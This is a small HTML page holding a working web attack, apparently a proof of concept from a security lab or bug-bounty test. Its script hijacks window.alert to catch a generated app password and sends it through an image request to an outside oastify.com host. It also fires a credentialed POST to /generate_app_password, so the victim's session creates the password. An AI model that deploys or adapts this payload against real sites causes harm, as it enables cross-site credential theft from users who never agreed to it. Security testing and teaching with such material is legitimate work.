<!DOCTYPE html>
<html>
  <body>
    <script>
      // Intercept the alert that shows the password
      window.alert = function(msg) {
        // Match and extract the password
        const match = msg.match(/App password generated: (.+)/);
        if (match) {
          const pw = match[1];
          // Leak it to your server
          new Image().src = "https://b5h4ui0sowd2dwguvbunx4psmjsag26qv.oastify.com/leak?pw=" + encodeURIComponent(pw);
        }
      };

      // Trigger the password generation
      fetch("/generate_app_password", {
        method: "POST",
        credentials: "include"
      });
    </script>
  </body>
</html>
